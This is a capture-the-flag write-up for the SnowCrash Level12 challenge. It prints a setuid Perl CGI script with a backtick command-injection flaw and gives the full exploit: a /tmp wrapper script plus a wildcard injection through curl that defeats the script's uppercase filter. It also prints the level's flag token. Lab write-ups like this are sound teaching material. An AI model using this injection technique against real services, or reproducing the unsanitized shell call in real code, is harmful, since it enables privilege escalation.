# 🚩 SnowCrash — Level12

## 🎯 Goal

Find the password for **flag12**.

---

## 1. Check the current directory

```bash
ls -la
```

**Result:**

```
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```

A setuid Perl CGI script.

---

## 2. Analyze the Perl script

```bash
cat level12.pl
```

**Content:**

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

**Analysis:**

The script:
1. Runs a CGI web server on `localhost:4646`
2. Takes parameters `x` and `y` from HTTP requests
3. Processes the `x` parameter:
   - Converts all lowercase to uppercase: `tr/a-z/A-Z/`
   - Removes everything after the first space: `s/\s.*//`
   - **Executes a shell command** using backticks: `` `egrep "^$xx" /tmp/xd 2>&1` ``

**Vulnerability:** Command injection via backticks!

---

## 3. Test the web server

```bash
curl http://localhost:4646?x=test
```

**Output:**

```
..
```

The server is running and responds (prints ".." because egrep found no match).

---

## 4. Exploit strategy

**Problem:** We need to inject a command to execute `getflag`, but:
- Input gets converted to **UPPERCASE** (`getflag` → `GETFLAG`)
- Everything after the first **space** is removed

**Solution:** Create an uppercase wrapper script that calls `getflag`!

---

## 5. Create the exploit

### Step 1: Prepare `/tmp/xd` file

```bash
echo "GETFLAG" > /tmp/xd
```

This ensures egrep has something to search in (required by the script logic).

### Step 2: Create an uppercase wrapper script

```bash
echo "getflag > /tmp/flag12" > /tmp/FLAGGG
chmod +x /tmp/FLAGGG
```

This creates an executable script with an UPPERCASE name that:
- Calls `getflag` (with correct lowercase)
- Redirects output to `/tmp/flag12`

### Step 3: Inject the command

```bash
curl -s 'http://localhost:4646?x=`/*/FLAGGG`'
```

**What happens:**
1. Input: `` `/*/FLAGGG` ``
2. Converted to uppercase: `` `/*/FLAGGG` `` (already uppercase, wildcards preserved)
3. The `/*` wildcard matches `/tmp`
4. Shell executes: `` `/tmp/FLAGGG` ``
5. The script runs with **flag12** privileges (setuid)
6. `getflag` executes and writes the token to `/tmp/flag12`

### Step 4: Read the flag

```bash
cat /tmp/flag12
```

**Output:**

```
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

---

## 6. Summary

**Vulnerability:** Command injection in Perl CGI script using backticks.

**Bypass technique:** Create uppercase-named wrapper script to circumvent the lowercase-to-uppercase conversion.

**Exploitation:**
1. Create `/tmp/FLAGGG` script that calls `getflag`
2. Inject `` `/*/FLAGGG` `` via the web parameter
3. Retrieve flag from `/tmp/flag12`

---

## 🏁 Flag

```
g1qKMiRpXf53AWhDaU7FEkczr
```

---

## 📝 Notes

- **Command injection** via shell backticks in user input
- **Uppercase conversion bypass** using pre-created uppercase scripts
- **Wildcard expansion** (`/*/FLAGGG`) to find scripts in `/tmp`
- The setuid bit allows the script to run with `flag12` privileges
- Never trust user input in shell commands—always sanitize!
